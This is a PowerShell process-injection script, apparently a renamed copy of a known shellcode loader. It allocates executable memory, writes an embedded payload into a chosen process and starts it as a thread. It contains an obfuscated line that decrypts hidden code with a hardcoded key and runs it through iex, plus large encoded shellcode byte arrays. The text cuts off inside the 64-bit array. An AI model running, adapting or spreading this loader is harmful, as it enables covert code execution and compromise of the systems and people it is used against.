function Invoke-Codie
{

[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Codie,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0

    if ( $PSBoundParameters['ProID'] )
    {
        
        Get-Process -Id $ProID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        ieX ( (NEw-obJEcT MaNAgeMEnt.aUTOMATioN.PSCrEDENtIal  ' ', ('76492d1116743f0423413b16050a5345MgB8AE0ATQBWAGQAYgBhAEwAMABZADUAeABPAG8AMgBkADEAeAB3AFQAWAA1AEEAPQA9AHwAOAA4AGYAZgBkAGIAMAA1AGEAZAAxADcANwAzAGMAZQBmADgANwBmAGQAOQAyADkAMAAxAGQAOQA3AGEAMwBiADgANABhAGMANQAzADYAMQBmADUAMQAyAGEANABiADEAOQBhAGQAYgA5AGUAZgBjADgAZgA1ADgAOABhADcAZAA1AGMANwBlADUAZQA3AGUANABhADAANQBjADQANAA5ADQANwBiAGQANABhADYAZAA3AGIAMwA4AGMANwA1AGMANgA3AGEAOABiAGEAMAA1ADQAZQAyADkANAAxADUAMABlAGIAMABkADgAYQBjADcAOQA0AGQAOQBhADQAZgA4ADEAZAA0AGIAMgBjAGEAMwA0ADMAMwBmADMAZQBiAGEAMQBjADAAYQBjADgANgBmADYAOABmADQAYwA3AGQAMAAxAGUANgBmAGYAYwA2ADEAYQA0ADYAZAAyADAANwBlADkAYgA0AGMAYQA3AGEAYgA1AGUAOAA4ADAAOQA3ADIAZQA2AGYAMAA4AGQANwBmADUANgAzADYANwA1AGIANwBhADIANQBmADMANQBhADUAOABmADUAMgBmADcAZABmAGMAYQAwADEAYgA0ADIAMQA1ADYAMQAwAGUAOAA3AGYAMQA5ADQAYwA4AGYAOAAzAGYAYwAyADcAZQAyAGMANgBhAGEANQAxAGMAMAA1AGIAYgA0AGIAYwA3AGUAMABlADAANQA5ADcAYgBjAGQAMAA0AGIANgA0AGQAMQA2AGUAMwA0AGQAOQA2ADIANgAzAGQAMAA5AGQAMABkADYANQA2AGIAOQAzADgANAA2AGYAMQA3ADEAYgBlAGMAZgA1ADIAZQAxAGIAZQBhAGYAOQA1ADcAYQA4AGQAOQA1ADAAMwA0AGUANwAzADQAOAA0ADIAMwAxADMAOQBiADAANQA2ADgANABjAGYAZQA0ADEAYQBhAGIAMgA4ADIAMwAwADYANQA4ADgANgA2ADEANAAxADIANQA0ADkAZAAyADcAOABkAGMAOAA0AGMAYQAxAGIAYgBmADIAYwBhADcAYwAwADMANQBkADcAZAA0ADAAZgA0AGMAZQAzADYANwA1ADcANwA2ADkANQBhADMAOAA1AGYAMgBjADAAOQAyADUAMAA3ADEAOABiAGMAZgA2ADAANQA2ADQAMQBkAGYAMwA5ADcAYwA5AGYAOQAxADgAMwBkADUAMwA3ADEAZQAzADUANQBhAGUANgBjADAAZQBjAGYAZgA4ADkAOAA0ADIAYQA0ADMAZgBhADIAYQBjAGYANwBhADAAMwA2ADEAYQA0ADUAMwBhADUAMgBjAGMAYwAzADUANwBjAGUANgBhADMAZgBmADcAZQBjADcAMQBiADkAYwA4ADMAOQBhADIAMQA1AGEAYgA0ADgAYQBhADQAYQBiAGYANwA0AGMAZgA='|COnvertto-SECUREstriNG -kE 229,246,240,34,249,250,114,80,110,234,230,60,76,212,101,119,171,157,77,181,89,19,164,20)).GeTNetwoRkCrEDEnTiAL().pASSWoRd )
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )


        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
     
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
      
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
       
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

  
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $StubbyCall = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $StubbyCall = 0x48,0xB8                    
            $StubbyCall += ConvertTo-LittleEndian $BaseAddr    
            $StubbyCall += 0xFF,0xD0                            
            $StubbyCall += 0x6A,0x00                          
            $StubbyCall += 0x48,0xB8                             
            $StubbyCall += ConvertTo-LittleEndian $ExitThreadAddr
            $StubbyCall += 0xFF,0xD0                            
        }
        else
        {
            [Byte[]] $StubbyCall = 0xB8                         
            $StubbyCall += ConvertTo-LittleEndian $BaseAddr       
            $StubbyCall += 0xFF,0xD0                             
            $StubbyCall += 0x6A,0x00                             
            $StubbyCall += 0xB8                                  
            $StubbyCall += ConvertTo-LittleEndian $ExitThreadAddr 
            $StubbyCall += 0xFF,0xD0                             
        }
        
        Write-Output $StubbyCall
    }

    function Local:Injection-CodieRemote ([Int] $ProID)
    {
       
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProID) 
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProID"
        }

        $IsWow64 = $false

        if ($64bitOS)
        {
            
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Codie injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64)
            {
                if ($Codie32.Length -eq 0)
                {
                    Throw 'No Codie was placed in the $Codie32 variable!'
                }
                
                $Codie = $Codie32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit Codie.'
            }
            else 
            {
                if ($Codie64.Length -eq 0)
                {
                    Throw 'No Codie was placed in the $Codie64 variable!'
                }
                
                $Codie = $Codie64
                Write-Verbose 'Using 64-bit Codie.'
            }
        }
        else
        {
            if ($Codie32.Length -eq 0)
            {
                Throw 'No Codie was placed in the $Codie32 variable!'
            }
            
            $Codie = $Codie32
            Write-Verbose 'Using 32-bit Codie.'
        }

      
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Codie.Length + 1, 0x3000, 0x40) 
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate Codie memory in PID: $ProID"
        }
        
        Write-Verbose "Codie memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

       
        $MemProWrite.Invoke($hProcess, $RemoteMemAddr, $Codie, $Codie.Length, [Ref] 0) | Out-Null

       
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
           
            $StubbyCall = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            
            $StubbyCall = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $StubbyCall.Length, 0x3000, 0x40) 
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

      
        $MemProWrite.Invoke($hProcess, $RemoteStubAddr, $StubbyCall, $StubbyCall.Length, [Ref] 0) | Out-Null

     
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProID"
        }

       
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Codie injection complete!'
    }

    function Local:Injection-CodieLocal
    {
        if ($PowerShell32bit) {
            if ($Codie32.Length -eq 0)
            {
                Throw 'No Codie was placed in the $Codie32 variable!'
                return
            }
            
            $Codie = $Codie32
            Write-Verbose 'Using 32-bit Codie.'
        }
        else
        {
            if ($Codie64.Length -eq 0)
            {
                Throw 'No Codie was placed in the $Codie64 variable!'
                return
            }
            
            $Codie = $Codie64
            Write-Verbose 'Using 64-bit Codie.'
        }
    
       
        $AddyBasey = $VirtualAlloc.Invoke([IntPtr]::Zero, $Codie.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$AddyBasey)
        {
            Throw "Unable to allocate Codie memory in PID: $ProID"
        }
        
        Write-Verbose "Codie memory reserved at 0x$($AddyBasey.ToString("X$([IntPtr]::Size*2)"))"

        
        [System.Runtime.InteropServices.Marshal]::Copy($Codie, 0, $AddyBasey, $Codie.Length)
        
      
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $StubbyCall = Emit-CallThreadStub $AddyBasey $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $StubbyCall = Emit-CallThreadStub $AddyBasey $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

      
        $StubbyCallPointer = $VirtualAlloc.Invoke([IntPtr]::Zero, $StubbyCall.Length + 1, 0x3000, 0x40)
        if (!$StubbyCallPointer)
        {
            Throw "Unable to allocate thread call stub."
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($StubbyCallPointer.ToString("X$([IntPtr]::Size*2)"))"

    
        [System.Runtime.InteropServices.Marshal]::Copy($StubbyCall, 0, $StubbyCallPointer, $StubbyCall.Length)

       
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $StubbyCallPointer, $AddyBasey, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($StubbyCallPointer, $StubbyCall.Length + 1, 0x8000) | Out-Null 
        $VirtualFree.Invoke($AddyBasey, $Codie.Length + 1, 0x8000) | Out-Null 

        Write-Verbose 'Codie injection complete!'
    }

   
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    $AddressWidth = $null

    try {
        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
    } catch {
        throw 'Unable to determine OS processor address width.'
    }

    switch ($AddressWidth) {
        '32' {
            $64bitOS = $False
        }

        '64' {
            $64bitOS = $True

            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        }

        default {
            throw 'Invalid OS address width detected.'
        }
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PSBoundParameters['Codie'])
    {
        
        [Byte[]] $Codie32 = $Codie
        [Byte[]] $Codie64 = $Codie32
    }
    else
    {
       
[Byte[]] $Codie32 = 0xda,0xcd,0xba,0x65,0x9a,0x57,0x87,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0x66,0xb9,0xf,0x1,0x83,0xeb,0xfc,0x31,0x53,0x15,0x3,0x36,0x8f,0xb5,0x72,0x5,0x26,0x31,0x83,0xd2,0xe0,0xb4,0xa2,0x68,0x37,0xcd,0xf,0xa1,0xfe,0x4b,0x9,0xc6,0x1,0x17,0x83,0x34,0x30,0x7d,0x47,0xc7,0x59,0x92,0x85,0xbb,0x4e,0xb3,0x54,0x53,0xd5,0xd1,0xd,0x66,0x45,0x9c,0x4a,0x13,0xd5,0x9f,0x6c,0xb9,0xd5,0x1e,0x35,0xa7,0x1e,0x6f,0xa9,0x62,0x6b,0x77,0x65,0xb9,0x12,0x39,0xd3,0x56,0x5d,0x40,0x88,0xfd,0xa5,0xe4,0x0,0xc6,0x7a,0x45,0xa4,0x41,0xce,0x50,0x60,0x65,0x1e,0xe1,0xa2,0x7c,0xda,0x30,0x36,0x2e,0x32,0xb4,0xf9,0x51,0x36,0x1f,0x87,0x65,0xb0,0x47,0x87,0x9b,0x7e,0x9e,0xbc,0x69,0xe5,0x4,0x91,0x3c,0x15,0x11,0xd0,0xf2,0xd8,0xe,0xd0,0xe8,0xef,0xfd,0x98,0xb9,0xd1,0xbc,0x61,0x1e,0xa3,0xee,0xca,0xbc,0xb3,0x67,0xce,0x37,0x9b,0xa,0x7d,0xca,0xfa,0x57,0x77,0x62,0xe,0x33,0xbc,0x68,0x28,0x39,0x77,0xfa,0x7f,0x30,0x5e,0xad,0x5b,0x8c,0xa7,0x9b,0x96,0xb8,0xb4,0x1,0x5a,0x25,0xe1,0x34,0xbf,0x87,0x19,0xfb,0x19,0x70,0xe9,0x41,0xb7,0xeb,0x25,0x1d,0xfe,0x7b,0x89,0xa3,0x19,0x24,0xff,0x60,0xc5,0xf2,0x73,0xbd,0x6a,0xc2,0x71,0x3f,0x14,0xd0,0xf8,0x3d,0x8a,0x84,0x45,0xe3,0x9f,0x75,0x15,0xe1,0x45,0x94,0xbe,0xff,0x9f,0x7b,0xa2,0x8a,0x34,0xe0,0x76,0x27,0x3,0x81,0xa6,0x72,0xb6,0x49,0xfa,0x21,0xb3,0x67,0x5d,0xa4,0xb3,0xfd,0x69,0xdc,0x44,0x4c,0x4b,0xb8,0x75,0x6d,0xe,0x19,0x4d,0x2a,0xde,0x42,0xc9,0x8b,0x97,0xbe,0xc7,0x10,0x41,0xb8,0x7a,0xfe,0x39,0xf6,0x9a,0x2,0xc1,0x38,0xb8,0x3c,0x6e,0x9e,0x46,0x6e,0x97,0xc8,0xc9,0x30,0xd6,0x96,0x6a,0xc6,0x88,0xa8,0xd,0x4e,0x53,0xde,0xca,0x16,0x47,0xd8,0x86,0xac,0x2b,0x76,0x13,0xc,0x83,0x58,0xbe,0xc2,0xb4,0x1e,0x1c,0xc5,0xa6,0x68,0x5e,0x36,0x3b,0x56,0x59,0x28,0xff,0x8,0x12,0xb9,0x37,0x5e,0x77,0xbb,0xfc,0xf8,0x5,0x95,0xfb,0xf6,0x76,0xd7,0x70,0x78,0x25,0x66,0x92,0x9e,0xd2,0x28,0x94,0x8,0x74,0x85,0x6f,0x16,0x2f,0x46,0xd9,0xe8,0xcf,0xf7,0x49,0x5e,0x4a,0x70,0xbf,0x98,0x54,0xea,0xd3,0x76,0xd0,0xbc,0xd3,0x98,0xe6,0x3,0x69,0x1e,0xd7,0xc8,0x53,0x28,0x9b,0xef,0x96,0x56,0x5,0x33,0x70,0x48,0xca,0x25,0x3f,0xde,0x91,0x52,0x2c,0x38,0x58,0x6f,0x93,0xf6,0x56,0x86,0x1d,0xb8,0xb4,0x9c,0x39,0x9e,0xa8,0x82,0x7d,0x48,0x2e,0x93,0x6e,0x96,0xcc,0xc5,0x9c,0x28,0xa5,0x3c,0x60,0xde,0x8b,0x7d,0x94,0x58,0x59,0x38,0x13,0x76,0x84,0x8e,0x25,0xd8,0x8c,0x46,0x1f,0x1e,0xdb,0x38,0x2d,0xe8,0x42,0x9c,0x26,0x56,0xa2,0x7d,0xf7,0x88,0x9e,0xef,0x1b,0x5e,0x55,0x9b,0x33,0x78,0x49,0x16,0x53,0xf6,0x1c,0xae,0xd0,0xf8,0xe,0xcb,0xc2,0x9e,0x9a,0x52,0xe2,0x88,0xb3,0xd8,0x26,0x16,0x5e,0x6f,0x52,0x68,0xf9,0xe1,0x97,0x5e,0x80,0x97,0x9a,0x18,0xbd,0x2,0x8b,0x76,0xab,0xaa,0x5f,0x18,0x0,0x51,0x1d,0x1e,0xec,0xc8,0xac,0xa8,0xdd,0xab,0xa7,0x56,0x83,0x9,0x89,0xc8,0x90,0xed,0xbd,0xde,0xe6,0x55,0x4,0xb8,0xa6,0xce,0x54,0xf6,0x9e,0xaa,0x79,0x38,0xc3,0x11,0x27,0x9e,0xe5,0xf5,0x8b,0xc8,0x87,0x59,0xc5,0x96,0xc,0x4,0x2f,0xa8,0x4f,0xa7,0x99,0xde,0x6a,0x46,0xcc,0xd8,0x81,0xef,0x69,0x76,0xb0,0x85,0xf3,0x58,0xe9,0x31,0x66,0x1e,0xe2,0xaf,0x95,0x68,0xd5,0x5d,0x31,0x56,0xba,0xd3,0x16,0x8,0x38,0x6d,0x40,0x5e,0x95,0xe8,0x5e,0xf8,0xfb,0x8b,0x8b,0xf6,0xcd,0x1e,0xc7,0x78,0xb,0xaa,0x81,0x9e,0x26,0x3e,0x1a,0x8,0xc2,0xa2,0x5c,0x16,0xe5,0x7c,0xcc,0xe8,0xaf,0x2f,0x46,0x5e,0x7e,0x98,0xe4,0x98,0xa6,0x68,0x11,0x76,0x3e,0x30,0xd7,0x98,0x3e,0x8c,0x0,0x1e,0xae,0xd6,0x91,0x28,0x5c,0x7,0x6b,0x56,0x81,0x6e,0xc6,0x48,0x3,0x6f,0x19,0xde,0xfe,0x94,0x3b,0x38,0xb4,0x9a,0x96,0xf6,0x31,0x50,0x60,0xb8,0x73,0x73,0xca,0x9e,0xd8,0x94,0x8c,0x48,0xbd,0xb6,0xc0,0x96,0x6d,0xff,0x7a,0x28,0xe1,0xcc,0xe7,0xde,0xc7,0x75,0xb6,0x58,0x13,0x21,0xee,0x76,0xd8,0xbc,0x9a,0xd8,0x53,0x42,0x4f,0x1e,0xef,0xc9,0xde,0xe8,0x63,0xaf,0x35,0x56,0x63,0xff,0xda,0xd8,0x5e,0x8,0x7e,0xf0,0x81,0xe4,0x7d,0xda,0xcf,0xcd,0x12,0x62,0xb1,0x68,0x34,0xf3,0xef,0xf2,0x60,0x53,0x7c,0xf0,0xf3,0x87,0x71,0xe6,0xa0,0xeb,0xba,0x4a,0x3d,0xec,0xc6,0x43,0xb,0xde,0xc0,0xe0,0x3a,0xaf,0x13,0x96,0x71,0xb9,0xdf,0x45,0x54,0xf9,0xd,0xe9,0xe4,0x3,0xe8,0xde,0x16,0x2d,0xe,0xfa,0x2,0x4,0x2,0xe6,0xc4,0x57,0x51,0xc4,0x52,0x48,0xf0,0xc7,0xc3,0xfe,0x87,0x93,0x6b,0xfd,0x63,0xd8,0x36,0x93,0xea,0x13,0xa8,0xd4,0x2a,0x41,0xee,0x71,0x69,0x1f,0x19,0x90,0xfd,0x9b,0x7e,0xe,0xe7,0xf,0xc,0x19,0xf7,0x9,0x22,0xc7,0x81,0xe8,0x13,0x16,0x66,0xa5,0x40,0x60,0xca,0x60,0xfa,0x55,0xdc,0x11,0x31,0xce,0x5c,0xa8,0xac,0x9f,0x93,0x67,0xe4,0x94,0xba,0xab,0x6,0xb9,0x8f,0x95,0x5a,0xb0,0xbc,0x7a,0x80,0xf8,0xd,0x7a,0x7e,0x99,0x35,0x4c,0x95,0x12,0x54,0xbb,0x9f,0x4,0x83,0x9b,0x98,0x91,0x26,0x2d,0xc4,0x96,0x99,0x23,0xab,0xf7,0x0,0x49,0xd5,0x70,0x0,0xaf,0x3c,0x91,0xa,0x3b,0x4e,0xb,0x2a,0xc4,0xd2,0x1,0xc7,0x8,0xc9,0xe5,0xe4,0x20,0x25,0x1f,0xd3,0xe4,0xc6,0x76,0x22,0xba,0x4f,0x95,0x86,0x57,0x43,0x2f,0x85,0xc9,0xac,0xeb,0x5,0x69,0xc0,0x2a,0x53,0x6e,0x45,0xc1,0x38,0x36,0xd6,0x45,0xa8,0x55,0x1b,0x32,0xfb,0x26,0xae,0x6a,0x68,0xd6,0xee,0xc7,0x46,0xa0,0xce,0xad,0xad,0x42,0x68,0x9f,0x6d,0x1f,0xab,0xfc,0xbe,0xbb,0xfc,0x24,0xf3,0x8e,0x70,0x47,0x4f,0x85,0xa2,0x15,0x69,0x8,0xca,0x13,0xa4,0x32,0xe5,0x76,0x46,0xee,0x72,0xa5,0xcd,0xf8,0x5e,0x12,0x34,0xc9,0x8,0xe7,0x77,0x2b,0xd1,0xb9,0x11,0x8b,0x45,0xbd,0x33,0xc6,0x49,0x1f,0xe1,0xd,0xad,0xbd,0x5b,0xe0,0xf2,0x97,0xf6,0x83,0x80,0x15,0xe4,0x99,0xa0,0x34,0xb9,0xd1,0x14,0x3,0x14,0x23,0x1,0xc7,0x1,0x63,0x5b,0xb3,0xcb,0xc5,0x36,0x97,0xf3,0x46,0x3e,0xe9,0xea,0x7d,0xf3,0x35,0x4a,0x4a,0x5b,0x62,0xc,0x88,0xcc,0x20,0xcb,0x57,0xca,0xea,0x7b,0x6b,0x8f,0x6b,0xc2,0x58,0x78,0xcd,0xe0,0x82,0x79,0xf7,0xbb,0x7f,0xf1,0x40,0x4c,0xe1,0x2,0x1,0xe2,0x31,0x75,0x71,0x55,0x29,0xdf,0x6,0xa4,0x16,0xb8,0x85,0xd0,0xef,0x75,0x8e,0xe4,0xfa,0xba,0xd9,0xc0,0x5b,0xd4,0x86,0x8e,0xba,0x66,0xc0,0x30,0xc,0xbf,0x31,0xa7,0x6,0x21

        
[Byte[]] $Codie64 = 0xda,0xcd,0xba,0x65,0x9a,0x57,0x87,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0x66,0xb9,0xf,0x1,0x83,0xeb,0xfc,0x31,0x53,0x15,0x3,0x36,0x8f,0xb5,0x72,0x5,0x26,0x31,0x83,0xd2,0xe0,0xb4,0xa2,0x68,0x37,0xcd,0xf,0xa1,0xfe,0x4b,0x9,0xc6,0x1,0x17,0x83,0x34,0x30,0x7d,0x47,0xc7,0x59,0x92,0x85,0xbb,0x4e,0xb3,0x54,0x53,0xd5,0xd1,0xd,0x66,0x45,0x9c,0x4a,0x13,0xd5,0x9f,0x6c,0xb9,0xd5,0x1e,0x35,0xa7,0x1e,0x6f,0xa9,0x62,0x6b,0x77,0x65,0xb9,0x12,0x39,0xd3,0x56,0x5d,0x40,0x88,0xfd,0xa5,0xe4,0x0,0xc6,0x7a,0x45,0xa4,0x41,0xce,0x50,0x60,0x65,0x1e,0xe1,0xa2,0x7c,0xda,0x30,0x36,0x2e,0x32,0xb4,0xf9,0x51,0x36,0x1f,0x87,0x65,0xb0,0x47,0x87,0x9b,0x7e,0x9e,0xbc,0x69,0xe5,0x4,0x91,0x3c,0x15,0x11,0xd0,0xf2,0xd8,0xe,0xd0,0xe8,0xef,0xfd,0x98,0xb9,0xd1,0xbc,0x61,0x1e,0xa3,0xee,0xca,0xbc,0xb3,0x67,0xce,0x37,0x9b,0xa,0x7d,0xca,0xfa,0x57,0x77,0x62,0xe,0x33,0xbc,0x68,0x28,0x39,0x77,0xfa,0x7f,0x30,0x5e,0xad,0x5b,0x8c,0xa7,0x9b,0x96,0xb8,0xb4,0x1,0x5a,0x25,0xe1,0x34,0xbf,0x87,0x19,0xfb,0x19,0x70,0xe9,0x41,0xb7,0xeb,0x25,0x1d,0xfe,0x7b,0x89,0xa3,0x19,0x24,0xff,0x60,0xc5,0xf2,0x73,0xbd,0x6a,0xc2,0x71,0x3f,0x14,0xd0,0xf8,0x3d,0x8a,0x84,0x45,0xe3,0x9f,0x75,0x15,0xe1,0x45,0x94,0xbe,0xff,0x9f,0x7b,0xa2,0x8a,0x34,0xe0,0x76,0x27,0x3,0x81,0xa6,0x72,0xb6,0x49,0xfa,0x21,0xb3,0x67,0x5d,0xa4,0xb3,0xfd,0x69,0xdc,0x44,0x4c,0x4b,0xb8,0x75,0x6d,0xe,0x19,0x4d,0x2a,0xde,0x42,0xc9,0x8b,0x97,0xbe,0xc7,0x10,0x41,0xb8,0x7a,0xfe,0x39,0xf6,0x9a,0x2,0xc1,0x38,0xb8,0x3c,0x6e,0x9e,0x46,0x6e,0x97,0xc8,0xc9,0x30,0xd6,0x96,0x6a,0xc6,0x88,0xa8,0xd,0x4e,0x53,0xde,0xca,0x16,0x47,0xd8,0x86,0xac,0x2b,0x76,0x13,0xc,0x83,0x58,0xbe,0xc2,0xb4,0x1e,0x1c,0xc5,0xa6,0x68,0x5e,0x36,0x3b,0x56,0x59,0x28,0xff,0x8,0x12,0xb9,0x37,0x5e,0x77,0xbb,0xfc,0xf8,0x5,0x95,0xfb,0xf6,0x76,0xd7,0x70,0x78,0x25,0x66,0x92,0x9e,0xd2,0x28,0x94,0x8,0x74,0x85,0x6f,0x16,0x2f,0x46,0xd9,0xe8,0xcf,0xf7,0x49,0x5e,0x4a,0x70,0xbf,0x98,0x54,0xea,0xd3,0x76,0xd0,0xbc,0xd3,0x98,0xe6,0x3,0x69,0x1e,0xd7,0xc8,0x53,0x28,0x9b,0xef,0x96,0x56,0x5,0x33,0x70,0x48,0xca,0x25,0x3f,0xde,0x91,0x52,0x2c,0x38,0x58,0x6f,0x93,0xf6,0x56,0x86,0x1d,0xb8,0xb4,0x9c,0x39,0x9e,0xa8,0x82,0x7d,0x48,0x2e,0x93,0x6e,0x96,0xcc,0xc5,0x9c,0x28,0xa5,0x3c,0x60,0xde,0x8b,0x7d,0x94,0x58,0x59,0x38,0x13,0x76,0x84,0x8e,0x25,0xd8,0x8c,0x46,0x1f,0x1e,0xdb,0x38,0x2d,0xe8,0x42,0x9c,0x26,0x56,0xa2,0x7d,0xf7,0x88,0x9e,0xef,0x1b,0x5e,0x55,0x9b,0x33,0x78,0x49,0x16,0x53,0xf6,0x1c,0xae,0xd0,0xf8,0xe,0xcb,0xc2,0x9e,0x9a,0x52,0xe2,0x88,0xb3,0xd8,0x26,0x16,0x5e,0x6f,0x52,0x68,0xf9,0xe1,0x97,0x5e,0x80,0x97,0x9a,0x18,0xbd,0x2,0x8b,0x76,0xab,0xaa,0x5f,0x18,0x0,0x51,0x1d,0x1e,0xec,0xc8,0xac,0xa8,0xdd,0xab,0xa7,0x56,0x83,0x9,0x89,0xc8,0x90,0xed,0xbd,0xde,0xe6,0x55,0x4,0xb8,0xa6,0xce,0x54,0xf6,0x9e,0xaa,0x79,0x38,0xc3,0x11,0x27,0x9e,0xe5,0xf5,0x8b,0xc8,0x87,0x59,0xc5,0x96,0xc,0x4,0x2f,0xa8,0x4f,0xa7,0x99,0xde,0x6a,0x46,0xcc,0xd8,0x81,0xef,0x69,0x76,0xb0,0x85,0xf3,0x58,0xe9,0x31,0x66,0x1e,0xe2,0xaf,0x95,0x68,0xd5,0x5d,0x31,0x56,0xba,0xd3,0x16,0x8,0x38,0x6d,0x40,0x5e,0x95,0xe8,0x5e,0xf8,0xfb,0x8b,0x8b,0xf6,0xcd,0x1e,0xc7,0x78,0xb,0xaa,0x81,0x9e,0x26,0x3e,0x1a,0x8,0xc2,0xa2,0x5c,0x16,0xe5,0x7c,0xcc,0xe8,0xaf,0x2f,0x46,0x5e,0x7e,0x98,0xe4,0x98,0xa6,0x68,0x11,0x76,0x3e,0x30,0xd7,0x98,0x3e,0x8c,0x0,0x1e,0xae,0xd6,0x91,0x28,0x5c,0x7,0x6b,0x56,0x81,0x6e,0xc6,0x48,0x3,0x6f,0x19,0xde,0xfe,0x94,0x3b,0x38,0xb4,0x9a,0x96,0xf6,0x31,0x50,0x60,0xb8,0x73,0x73,0xca,0x9e,0xd8,0x94,0x8c,0x48,0xbd,0xb6,0xc0,0x96,0x6d,0xff,0x7a,0x28,0xe1,0xcc,0xe7,0xde,0xc7,0x75,0xb6,0x58,0x13,0x21,0xee,0x76,0xd8,0xbc,0x9a,0xd8,0x53,0x42,0x4f,0x1e,0xef,0xc9,0xde,0xe8,0x63,0xaf,0x35,0x56,0x63,0xff,0xda,0xd8,0x5e,0x8,0x7e,0xf0,0x81,0xe4,0x7d,0xda,0xc